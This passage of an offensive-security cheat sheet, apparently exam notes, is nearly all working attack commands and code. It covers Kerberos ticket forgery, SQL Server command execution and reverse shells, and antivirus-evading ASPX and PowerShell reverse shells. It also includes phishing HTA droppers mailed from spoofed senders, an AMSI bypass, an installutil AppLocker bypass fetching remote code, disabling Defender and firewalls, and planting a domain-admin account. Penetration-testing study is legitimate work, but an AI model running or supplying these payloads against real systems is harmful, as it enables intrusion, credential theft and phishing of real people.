[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (N.Thompson)
[+] Printing hash for (N.Thompson)
$krb5tgs$23$*N.Thompson$DELEGATE.VL$delegate.vl/N.Thompson*$63936680ade026558a2b7...................................
[VERBOSE] SPN removed successfully for (N.Thompson)

$ hashcat -m 13100 thompson.hash /usr/share/wordlists/rockyou.txt
```

#### WriteDACL
```powershell
kali@kali$ evil-winrm -u 'sqlsvc' -H '1ef8ec7a4e862ed968d4d335afb77215' -i 172.16.177.151
*Evil-WinRM* PS C:\windows\tasks> $Username="tricky.com\sqlsvc"
*Evil-WinRM* PS C:\windows\tasks> $Password=ConvertTo-SecureString '4dfgdfFFF542' -AsPlainText -Force
*Evil-WinRM* PS C:\windows\tasks> $Cred = New-Object System.Management.Automation.PSCredential($Username, $Password)
*Evil-WinRM* PS C:\windows\tasks> Add-DomainObjectAcl -TargetIdentity 'MAILADMINS' -Rights All -PrincipalIdentity sqlsvc -Credential $Cred
*Evil-WinRM* PS C:\windows\tasks> Add-DomainGroupMember -Identity 'MAILADMINS' -Members 'sqlsvc' -Credential $Cred

*Evil-WinRM* PS C:\windows\tasks> Get-DomainGroupMember -Identity "MAILADMINS" -Credential $Cred


GroupDomain             : tricky.com
GroupName               : MailAdmins
GroupDistinguishedName  : CN=MailAdmins,OU=TGroups,DC=tricky,DC=com
MemberDomain            : tricky.com
MemberName              : sqlsvc
MemberDistinguishedName : CN=SQLSvc,OU=TSA,OU=TUsers,DC=tricky,DC=com
MemberObjectClass       : user
MemberSID               : S-1-5-21-500681758-3045653280-464737313-1104

#To actually use the MAILADMINS permissions, you need a fresh token. Exit your current Evil-WinRM session. Re-connect via Evil-WinRM.
#Run: whoami /groups
#You should now see TRICKY\MAILADMINS in the output.
```

### Kerberoasting
```powershell
# Rubeus
.\Rubeus.exe kerberoast /user:svc_web /nowrap

# Impacket (Linux)
impacket-GetUserSPNs domain.com/user:pass -dc-ip <DC_IP> -request -outputfile kerberoast.hash

# Targeted (Linux)
python3 targetedKerberoast.py -d 'domain.com' -u 'attacker' -p 'pass'

# Crack
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```

### Silver Ticket
```bash
# 1. Compute NT hash of service account password
iconv -f ascii -t utf16le <(printf 'Trustno1') | openssl dgst -md4

# 2. Get domain SID
$ impacket-getPac breach.vl/Julia.wong:Computer1 -targetUser Julia.wong
#OR
$ rpcclient -U 'Julia.wong%Computer1' 10.129.9.212 -c "lsaquery"

# 3. Forge ticket
$ impacket-ticketer -nthash 69596c7aa1e8daee17f8e78870e25a5c -domain-sid S-1-5-21-2330692793-3312915120-706255856 -domain breach.vl -spn MSSQLSvc/breachdc.breach.vl:1433 administrator

# 4. Use it
$ export KRB5CCNAME=administrator.ccache
$ impacket-mssqlclient -k -windows-auth target.domain.com
```

### Golden Ticket
```powershell
# Get krbtgt hash
$ lsadump::dcsync /domain:domain.com /user:krbtgt

# Forge ticket (mimikatz)
$ kerberos::golden /user:Administrator /domain:domain.com /sid:<Domain_SID> /sids:<Enterprise_Admin_SID-519> /krbtgt:<hash> /ticket:golden.kirbi

# Inject
$ kerberos::ptt golden.kirbi

# Linux equivalent
$ impacket-ticketer -nthash <krbtgt_hash> -domain-sid <child_SID> -extra-sid <parent_EA_SID-519> -domain child.domain.com Administrator
$ export KRB5CCNAME=Administrator.ccache
$ impacket-wmiexec -k -no-pass -dc-ip <DC_IP> 'CHILD.DOMAIN.COM/Administrator'@parent-dc.domain.com
```

### Resource-Based Constrained Delegation (RBCD)
```bash
# 1. Get machine account hash (or create a fake computer account)
impacket-addcomputer -k -no-pass -computer-name 'ATTACKER$' -computer-pass 'Password123!' cowmotors-int.com/terence.ford -dc-host dc02.cowmotors-int.com              

# 2. Configure delegation
impacket-rbcd -k -no-pass -delegate-from 'ATTACKER$' -delegate-to 'WEB01$' -action 'write' cowmotors-int.com/terence.ford -dc-ip 172.16.234.101

# 3. Get TGT for new computer account you created 
impacket-getTGT -dc-ip 172.16.234.101 'cowmotors-int.com/ATTACKER$:Password123!' 
export KRB5CCNAME=ATTACKER$.ccache

# 4. Impersonate admin on target
impacket-getST -k -no-pass \      
               -spn 'cifs/web01.cowmotors-int.com' \
               -impersonate 'Administrator' \
               -dc-ip 172.16.234.101 \
               'cowmotors-int.com/ATTACKER$'
kali@kali$ export KRB5CCNAME=Administrator@cifs_web01.cowmotors-int.com@COWMOTORS-INT.COM.ccache
kali@kali$ impacket-psexec -k -no-pass web01.cowmotors-int.com -target-ip 172.16.234.221 -dc-ip 172.16.234.101
```

### Print Spooler / Coercion
- We can exploit a printer bug if the print spooler service is running and is available on the domain controller
```powershell
PS C:\Windows\Tasks> dir \\dc03\pipe\spoolss

# Monitor for incoming TGTs (run as SYSTEM or domain user)
PS C:\Windows\Tasks> .\Rubeus.exe monitor /interval:5 /nowrap /filteruser:DC03$

# Coerce DC to authenticate to WEB05 (PSEXEC)
PS C:\Windows\Tasks> .\SpoolSample.exe DC03 WEB05

# Inject received ticket
PS C:\Windows\Tasks> .\Rubeus.exe ptt /ticket:doIFDDCCBQigAwIBBaEDAgEWo..
```

### Unconstrained Delegation
```powershell
PS C:\Windows\Tasks> Get-DomainComputer -Unconstrained
PS C:\windows\tasks> Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation
#OR
nxc ldap 10.129.234.69 -u 'N.Thompson' -p 'KALEB_2341' --trusted-for-delegation
```

### Bidirectional Forest Trust – Golden Ticket

```powershell
C:\Users\Administrator> nltest /domain_trusts
List of domain trusts:
    0: DEV dev.final.com (NT 5) (Forest: 1) (Direct Outbound) (Direct Inbound) ( Attr: withinforest )
    1: FINAL final.com (NT 5) (Forest Tree Root) (Primary Domain) (Native)

#1. Domain SID (FINAL.com):
PS C:\windows\tasks> Get-DomainSID
S-1-5-21-1725955968-4040474791-670206374

#2. SID of the Enterprise Admins group, with -519 at the end.:
PS C:\Windows\Tasks> Get-DomainSID -Domain dev.final.com
S-1-5-21-3097757723-3922880870-3169422460

#3. The KRBTGT NTLM Hash for FINAL.COM:
PS C:\Windows\Tasks> .\mimikatz.exe "privilege::debug" "lsadump::lsa /patch" "exit"
RID  : 000001f6 (502)
User : krbtgt
LM   : 
NTLM : 405854caaf49b41e0e585369a001f114

#4. Forge the Cross-Domain Golden Ticket
PS C:\Windows\Tasks> .\mimikatz.exe "kerberos::golden /user:Administrator /domain:final.com /sid:S-1-5-21-1725955968-4040474791-670206374 /sids:S-1-5-21-3097757723-3922880870-3169422460-519 /krbtgt:405854caaf49b41e0e585369a001f114 /ticket:pwn_child.kirbi" "exit"
 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Final Ticket Saved to file !

#5. Inject the Ticket and Access DC02
PS C:\Windows\Tasks> .\mimikatz.exe "kerberos::ptt pwn_child.kirbi" "exit"
* File: 'pwn_child.kirbi': OK

#6. now we can access DCO2
PS C:\Windows\Tasks> dir \\DC02.dev.final.com\c$

# Linux equivalent
kali@kali$ impacket-secretsdump -k -no-pass -dc-ip 172.16.54.168 'COMPLYEDGE.COM/pete'@dmzdc01.complyedge.com -just-dc-user krbtgt
kali@kali$ impacket-ticketer -nthash 1972974715cd3613d4105ad189e54950 \
-domain-sid S-1-5-21-1416213050-106196312-571527550 \
-extra-sid S-1-5-21-1135011135-3178090508-3151492220-519 \
-domain complyedge.com \
Administrator
export KRB5CCNAME=Administrator.ccache
impacket-wmiexec -k -no-pass -dc-ip 172.16.54.168 'COMPLYEDGE.COM/Administrator'@rdc02.comply.com

# Automated
$ raiseChild.py child.domain.com/domainadmin -hashes ':NT_hash'
```

---

## 🗄️ SQL Server

### Basic Commands (impacket-mssqlclient)
```bash
# Connect
$ impacket-mssqlclient user@<target>
$ impacket-mssqlclient domain/user@target -windows-auth
$ impacket-mssqlclient domain/user:'pass'@target -windows-auth

# Enable xp_cmdshell
> enable_xp_cmdshell
> xp_cmdshell whoami

# Manual enable
> sp_configure 'show advanced options', '1'; RECONFIGURE;
> sp_configure 'xp_cmdshell', '1'; RECONFIGURE;
> EXEC master..xp_cmdshell 'whoami'

# Enumerate
> enum_links
> enum_logins
> enum_users
> exec_as_login sa
> exec_as_user sa
> use_link LINKEDSERVER

# Enable RPC on linked server
>EXEC sp_serveroption 'SQL03', 'rpc', 'true';
>EXEC sp_serveroption 'SQL03', 'rpc out', 'true';
```

### Linked Server Exploitation
```sql
-- Enumerate
> EXEC sp_linkedservers
> SELECT name, is_rpc_out_enabled FROM sys.servers WHERE name = 'SQL27';

-- Execute on linked server
> EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [SQL27];
> EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [SQL27];
> EXEC ('xp_cmdshell ''whoami'';') AT [SQL27];

-- Reverse shell via linked server
> EXEC ('xp_cmdshell ''powershell -c "wget http://<kali>/nc64.exe -o C:\Temp\nc64.exe"''') AT [SQL27];
> EXEC ('xp_cmdshell ''C:\Temp\nc64.exe -e cmd <kali> 4444''') AT [SQL27];
```

### NTLM Relay via xp_dirtree
```bash
# Terminal 1: Set up relay
$ sudo impacket-ntlmrelayx -t smb://<target2> -smb2support

# Terminal 2: Trigger authentication from SQL server 1
$ impacket-mssqlclient user@<target1> -windows-auth
SQL> EXEC master.sys.xp_dirtree '\\<kali>\share'
# ntlmrelayx will relay the auth and dump SAM hashes on target2
```

### sqlmap
```bash
sqlmap -u "http://target/login.asp?user=a&password=a"
sqlmap -u "http://target/login.asp?user=a&password=a" --os-cmd=whoami --threads=10
sqlmap -u "http://target/login.asp?user=a&password=a" --os-shell
sqlmap -u "http://target/login.asp?user=a&password=a" --sql-shell

sqlmap -u "http://<victim ip>/login.asp?user=a&password=a" --os-cmd="net user hacker P@ssw0rd123! /add" 
sqlmap -u "http://<victim ip>/login.asp?user=a&password=a" --os-cmd="net localgroup administrators hacker /add"

http://192.168.X.X/login.asp?user=test&pass=1' or 1=1;EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE--
```

---

## 🐚 Shells & Payloads

### Reverse Shells

#### PowerShell
```powershell
$a = 'Net.Sockets.T'; $b = 'CPClient'; $c = New-Object ($a+$b)('192.168.49.56',443);
$s = $c.GetStream(); [byte[]]$b = 0..65535|%{0};
while(($i=$s.Read($b,0,$b.Length)) -ne 0){
    $d = (New-Object Text.ASCIIEncoding).GetString($b,0,$i);
    $sb = (iex $d 2>&1 | Out-String);
    $sy = ([Text.Encoding]::ASCII).GetBytes($sb+'PS '+(pwd).Path+'> ');
    $s.Write($sy,0,$sy.Length);
    $s.Flush();
```

#### Netcat
```powershell
$ start-process .\nc64.exe -args "-e cmd.exe <kali> 4444"
```

#### ASPX Web Shell (Simple)
```aspx
<%@Page Language="C#"%><%var p=new System.Diagnostics.Process{StartInfo={FileName=Request["c"],UseShellExecute=false,RedirectStandardOutput=true}};p.Start();%>
<%=p.StandardOutput.ReadToEnd()%>
```
- Usage: `http://target/shell.aspx?c=whoami`

#### ASPX Web Shell (Bypassess AV)
```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>
<script runat="server">

    // Simple reverse shell for ASPX. For educational purposes only!

    const string IP = "192.168.49.55";
    const ushort PORT = 443;

    const uint CREATE_NO_WINDOW = 0x08000000;
    const Int32 Startf_UseStdHandles = 0x00000100;

    [StructLayout(LayoutKind.Sequential)]
    public struct sockaddr_in
    {
        public short sin_family;
        public short sin_port;
        public uint sin_addr;
        public long sin_zero;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SECURITY_ATTRIBUTES {
      public int    Length;
      public IntPtr lpSecurityDescriptor;
      public bool   bInheritHandle;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO
    {
        public int cb;
        public String lpReserved;
        public String lpDesktop;
        public String lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Auto)]
    static extern bool CreateProcess(
       string lpApplicationName,
       string lpCommandLine,
       ref SECURITY_ATTRIBUTES lpProcessAttributes,
       ref SECURITY_ATTRIBUTES lpThreadAttributes,
       bool bInheritHandles,
       uint dwCreationFlags,
       IntPtr lpEnvironment,
       string lpCurrentDirectory,
       [In] ref STARTUPINFO lpStartupInfo,
       out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("ws2_32.dll", CharSet = CharSet.Unicode, SetLastError = true, CallingConvention = CallingConvention.StdCall)]
    internal static extern IntPtr WSASocket([In] AddressFamily addressFamily,
                                            [In] SocketType socketType,
                                            [In] ProtocolType protocolType,
                                            [In] IntPtr protocolInfo,
                                            [In] uint group,
                                            [In] int flags
                                            );


    [DllImport("ws2_32.dll")]
    public static extern int connect(IntPtr s, ref sockaddr_in addr, int addrsize);

    [DllImport("ws2_32.dll")]
    public static extern ushort htons(ushort hostshort);

    [DllImport("ws2_32.dll", CharSet = CharSet.Ansi)]
    public static extern uint inet_addr(string cp);

    [DllImport("ws2_32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    public static extern int closesocket(IntPtr s);

    [DllImport("ws2_32.dll", CharSet = CharSet.Auto)]
    static extern Int32 WSAGetLastError();

    protected void Page_Load(object sender, EventArgs e)
    {
        IntPtr socket;
        SpawnShell(IP, PORT, out socket);

        if( socket != IntPtr.Zero ) {
            closesocket(socket);
        }
    }

    protected void SpawnShell(string IP, ushort PORT, out IntPtr socket)
    {
        int error;
        socket = IntPtr.Zero;

        socket = WSASocket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.IP, IntPtr.Zero, 0, 0);
        error = WSAGetLastError();

        if( error != 0 ) {
            Response.Write("[-] WSASocket failed with error code: " + error + "\n");
            return;
        }

        sockaddr_in sockinfo = new sockaddr_in();
        sockinfo.sin_family = (short)2;
        sockinfo.sin_addr = inet_addr(IP);
        sockinfo.sin_port = (short)htons(PORT);

        if( connect(socket, ref sockinfo, Marshal.SizeOf(sockinfo)) != 0 ) {
            error = WSAGetLastError();
            Response.Write("[-] connect failed with error code: " + error + "\n");
            return;
        }

        string command = Environment.GetEnvironmentVariable("comspec");
        PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
        STARTUPINFO si = new STARTUPINFO();
        SECURITY_ATTRIBUTES sa = new SECURITY_ATTRIBUTES();
        sa.Length = Marshal.SizeOf(sa);

        si.dwFlags = Startf_UseStdHandles;
        si.hStdInput = socket;
        si.hStdOutput = socket;
        si.hStdError = socket;

        if( !CreateProcess(command, "", ref sa, ref sa, true, CREATE_NO_WINDOW, IntPtr.Zero, null, ref si, out pi) ) {
            error = Marshal.GetLastWin32Error();
            Response.Write("[-] CreateProcess failed with error: " + error + "\n");
            return;
        }

        Response.Write("[+] Process Created.\n");
    }
</script>
```

### msfvenom
```bash
# Linux ELF
kali@kali-[~] msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.49.52 LPORT=443 prependfork=true -f elf -t 300 -e /x64/xor_dynamic -o test.elf

# Windows MSI (for AlwaysInstallElevated)
kali@kali-[~] msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali> LPORT=443 -f msi -o evil.msi

# VBA payload for macros
kali@kali-[~] msfvenom -p windows/meterpreter/reverse_tcp LHOST=<kali> LPORT=443 EXITFUNC=thread -f vbapplication

# exec payload (for testing)
kali@kali-[~] msfvenom -p linux/x64/exec CMD="wget http://<kali>/$(whoami)" -f elf -o payload.elf
```

### msfconsole Handler
```ruby
msf> use exploit/multi/handler
msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf exploit(multi/handler) > set LHOST 192.168.49.57
msf exploit(multi/handler) > set LPORT 443
msf exploit(multi/handler) > set EXITFUNC thread
msf exploit(multi/handler) > run
```
---

## 📧 Phishing

### Responder + swaks
```bash
# 1. Start Responder
sudo responder -I eth0

# 2. diagnostic.hta
<html> 
<head> 
<script language="JScript">
var shell = new ActiveXObject("WScript.Shell");
var res = shell.Run("cmd.exe");
</script>
</head> 
<body>
<script language="JScript">
self.close();
</script>
</body> 
</html>

# 3. Send phishing email with UNC path
swaks --to victim@domain.com \
  --from admin@domain.com \
  --header "Subject: Diagnostic Tool" \
  --body "Please run: http://<kali>/diagnostic.hta" \
  --server <mail_server_ip>

#OR
#attach
swaks --to itsupport@outdated.htb \
--from test@external-validation.com \
--header "Subject: Mail Queue Diagnostic Report" \
--body "Please review the attached diagnostic configuration report for the monitoring team." \
--attach @diagnostic.doc \
--server 10.129.229.239

# 4. Once we get a hash back, we can copy the entire hash blob and use hashcat to crack it.
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

### Installutil (Works)
1. `shell.ps1` reverse shell:
```powershell
$client = New-Object System.Net.Sockets.TCPClient('192.168.49.55',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

2. Bypassing AppLocker with PowerShell
	- C# Console App project
- `Bypass.exe`:
```cs
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;

namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("This is the main method which is a decoy");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            String cmd = "IEX(New-Object Net.WebClient).DownloadString('http://192.168.49.55:8080/shell.ps1')";
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            ps.AddScript(cmd);
            ps.Invoke();
            rs.Close();
        }
    }
}
```

- Before compiling the project, we'll switch from "Debug" to "Release" mode and select 64-bit for compilation.
    
- Unfortunately, Visual Studio can not locate System.Management.Automation.Runspaces, to resolve this, we must manually add the assembly reference. First we'll right-click the References folder in the Solution Explorer and select Add Reference.... In most cases, the reference can be found in existing assemblies, but in this case, we'll need to specify a file location instead. To do this, we'll select the Browse... button at the bottom of the window and navigate to the **C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35 folder where we will select System.Management.Automation.dll**.
    
- Also we will notice that the System.Configuration.Install namespace is missing an assembly reference in Visual Studio. We can add this by again right-clicking on References in the Solution Explorer and choosing Add References.... From here, we'll navigate to the Assemblies menu on the left-hand side and scroll down to **System.Configuration.Install**
    

3. Now we are going to obfuscate the executable using certutil
```powershell
PS C:\Users\Administrator> certutil -encode C:\Users\Administrator\Source\Repos\Bypass\bin\x64\Release\Bypass.exe enc.txt
Input Length = 5120
Output Length = 7098
CertUtil: -encode command completed successfully.
```
- Now we have obfuscated `Bypass.exe` to `enc.txt`. we can copy `enc.txt` to our kali machine.

4. our email file that we are going to send to the victim
- `email.hta`:
```html
<html> 
<head> 
<script language="JScript">
    var shell = new ActiveXObject("WScript.Shell");
    var cmd = "powershell -Command \"iwr -uri http://192.168.49.55:8080/enc.txt -OutFile C:\\Windows\\Tasks\\enc.txt; certutil -decode C:\\Windows\\Tasks\\enc.txt C:\\Windows\\Tasks\\FinalBypass.exe; C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe /logfile= /LogToConsole=false /U C:\\Windows\\Tasks\\FinalBypass.exe\"";
    shell.Run(cmd, 0, true);
</script>
</head> 
<body>
<script language="JScript">
    self.close();
</script>
</body> 
</html>
```

5. Now we can send the email:
```shell
swaks --to Will@tricky.com \
--from administrator@tricky.com \
--header "Subject: Mail Queue Diagnostic" \
--body "Will, please run the diagnostic tool from the internal portal: http://192.168.49.55:8080/email.hta" \
--server 192.168.55.159

#OR
sendEmail -f administrator@cowmotors-int.com -t jobs@cowmotors-int.com -u "CV" -m "My CV" -a my-cv.doc -s 192.168.234.201 -v 
```

6. And finally, we get a shell:

```shell
kali@kali$ rlwrap nc -lnvp 443
```

### Another method
```html
#1. shell.ps1
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.56', 443)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush()
}
$client.Close()

#2. payload.hta
<html>
<head>
<script language="JScript">
    var shell = new ActiveXObject("WScript.Shell");
    shell.Run("powershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.56:8080/shell.ps1')\"", 0, false);
    window.close();
</script>
</head>
</html>

#3. http.server
kali@kali$ python3 -m http.server 8080

#4. Sending the email
swaks --to Will@tricky.com \
--from administrator@tricky.com \
--header "Subject: Mail Queue Diagnostic" \
--body "Please click here: http://10.10.14.56:8080/payload.hta" \
--server 192.168.55.159

#5. nc port 443
rlwrap nc -lnvp 443
```

---

## 🌐 SSH

### Add Your Public Key to a machine for persistence 
```bash
# Generate keypair on Kali
kali@kali-[~] ssh-keygen -t rsa

# Add to target
victim@victim$ echo "<your_pubkey>" >> /home/nottodd/.ssh/authorized_keys
victim@victim$ chmod 700 /home/pete@complyedge.com/.ssh 
victim@victim$ chmod 600 /home/nottodd/.ssh/authorized_keys
victim@victim$ chown -R pete@complyedge.com:"domain users@complyedge.com" /home/pete@complyedge.com/.ssh
```

### Port Forwarding
```bash
# Forward remote port 8081 to local 9090 via jump host
$ ssh -i id_rsa -L 9090:172.16.55.194:8081 user@jumphost_ip
# Then you can Access via: http://127.0.0.1:9090
```

---

## 🔀 Pivoting

### Ligolo-ng
```bash
# Kali – start proxy
kali@kali$> sudo ./proxy -selfcert

# In ligolo console
# Attack host - Establish a new interface for our pivoting
ligolo-proxy >> ifcreate --name pivot
# Attack host - List connected sessions and choose our established session from previous step
ligolo-proxy >> session
# Attack host - Create tunnel to the victim host
[Agent : HOSTNAME] >> tunnel_start --tun pivot 
# Attack host - Add routing to internal network
ligolo-proxy >> route_add --name pivot --route <INTERNAL_NETWORK>/<CIDR>

# Victim – connect agent
PS C:\Windows\Tasks> ./agent.exe -connect 192.168.49.55:11601 -ignore-cert
```

---

## 📂 File Transfer

### Download to Windows
```powershell
PS C:\windows\system32\inetsrv> (new-object system.net.webclient).downloadstring('http://192.168.49.55/amsi.txt') | IEX

PS C:\windows\system32\inetsrv> (new-object system.net.webclient).downloadstring('http://192.168.49.55/PowerView.ps1') | IEX

PS C:\inetpub\wwwroot\upload> certutil -urlcache -f http://192.168.49.64/nc.exe nc.exe

PS C:\inetpub\wwwroot\upload> certutil -urlcache -f http://192.168.49.64/PrintSpoofer64.exe PrintSpoofer64.exe

#if certutil is blocked, use bits admin to transfer files
bitsadmin /Transfer myJob http://192.168.45.231/Winpeas64.exe C:\Users\Public\Winpeas.exe
```

### SCP
```bash
# Pull file from target
kali@kali$ scp -i id_rsa pete@complyedge.com@192.168.54.164:/home/pete@complyedge.com/krb5.keytab ./krb5.keytab 

root@dev03:/etc$ ls -l /tmp/krb5cc_*
-rw------- 1 terence.ford@cowmotors-int.com domain users@cowmotors-int.com 1515 May  9 16:29 /tmp/krb5cc_1501201132_qSaGh5
root@dev03:/tmp$ cp krb5cc_1501201132_qSaGh5 /home/ansible
root@dev03:~$ chown ansible:ansible /home/ansible/krb5cc_1501201132_qSaGh5
root@dev03:~$ chmod 644 /home/ansible/krb5cc_1501201132_qSaGh5

kali@kali$ scp -i id_rsa ansible@172.16.234.224:/home/ansible/krb5cc_1501201132_qSaGh5 /home/kali/Downloads/terence.ccache
```

### SMB Share (upload files from windows to kali)
```bash
# Kali
kali@kali$> impacket-smbserver share . -smb2support -user test -password test

# Windows
C:\Windows\system32> net use \\192.168.49.55\share /user:test test
C:\Windows\system32> copy C:\Windows\tasks\lsass.dmp \\192.168.49.55\share\lsass.dmp
```

---

## 🛡️ Disable Defenses
```powershell
# Disable Windows Defender
PS C:\Windows\Tasks> powershell -ep bypass
PS C:\Windows\Tasks> Set-MpPreference -DisableRealtimeMonitoring $true -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableScriptScanning $true -SubmitSamplesConsent 2

# Disable Firewall
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False

# UAC
Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0

# Enable RDP
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh firewall add portopening TCP 3389 "Remote Desktop"
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0

# Enable WinRM
winrm quickconfig
```

---

## 🔑 Domain Admin Takeover

### Create DA User
```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> net user havex P@ssword123 /add /domain

*Evil-WinRM* PS C:\Users\Administrator\Desktop> net localgroup "Remote Desktop Users" havex /add /domain

*Evil-WinRM* PS C:\Users\Administrator\Desktop> net group "Domain Admins" havex /add /domain
```

### DCSync
```bash
impacket-secretsdump 'domain.com/DomainAdmin:pass@DC_IP'
```

### Restore Deleted AD Objects
```powershell
evil-winrm-py PS C:\> Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property objectSid,lastKnownParent
evil-winrm-py PS C:\> Get-ADOptionalFeature 'Recycle Bin Feature'
evil-winrm-py PS C:\> Restore-ADObject -Identity <ObjectGUID>
evil-winrm-py PS C:\> Get-ADUser cert_admin
```

---

## 🔧 Ansible Vault

```bash
# Find vault hash
marks@cb3:/opt/ansible$ cat webserver.yaml 
dev@dev02:~$ cat .root.enc

# Extract vault hash and transfer it to be able to crack it using john
# Also make sure all the spaces are removed in our machine when we copy the vault hash
kali@kali-[~] nano vault_raw.txt
kali@kali-[~] ansible2john vault_raw.txt > vault.hash
kali@kali-[~] john --wordlist=/usr/share/wordlists/rockyou.txt vault.hash

# Decrypt vault
marks@cb3:/tmp$ cat encrypted_vault.txt | ansible-vault decrypt
# Enter the cracked password when prompted
Vault password: PASS_FROM_JOHN
```

---

## 📦 PowerSharpPack
- https://github.com/S3cur3Th1sSh1t/PowerSharpPack Many useful offensive CSharp Projects wraped into Powershell for easy usage.
```powershell
# Bypass AMSI first
$x=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUt'+'ils');$y=$x.GetField('am'+'siCon'+'text',[Reflection.BindingFlags]'NonPublic,Static');$z=$y.GetValue($null);[Runtime.InteropServices.Marshal]::WriteInt32($z,0x41424344)

# Load PowerSharpPack
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpPack.ps1')

# Use a tool
PowerSharpPack -winPEAS
PowerSharpPack -Rubeus -Command "kerberoast /outfile:Roasted.txt"
```

---

> [!IMPORTANT]
> MTU fix for VPN stability: `sudo ip l s dev tun0 mtu 1250`

---

*Good luck on the exam. Enumerate everything, take notes.*
